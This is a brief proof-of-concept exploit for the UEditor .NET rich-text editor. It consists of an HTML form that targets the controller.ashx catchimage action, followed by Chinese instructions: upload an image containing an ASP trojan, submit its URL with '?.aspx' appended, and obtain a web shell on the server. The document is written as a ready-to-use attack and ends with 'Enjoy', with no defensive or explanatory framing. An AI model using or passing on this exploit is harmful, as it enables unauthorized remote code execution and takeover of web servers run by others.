# Ueditor .net GetShell

## POC

```html
<form action="http://xxxxxxxxx/controller.ashx?action=catchimage"enctype="application/x-www-form-urlencoded"  method="POST">
<p>shell addr:<input type="text" name="source[]" /></p >
<input type="submit" value="Submit" />
</form>
```
**先上传一张包含asp木马的正常图片，之后在shell addr中填入该图片的地址并在末尾加入?.aspx，如xxx.jpg?.aspx，提交后即可getshell**
## Enjoy
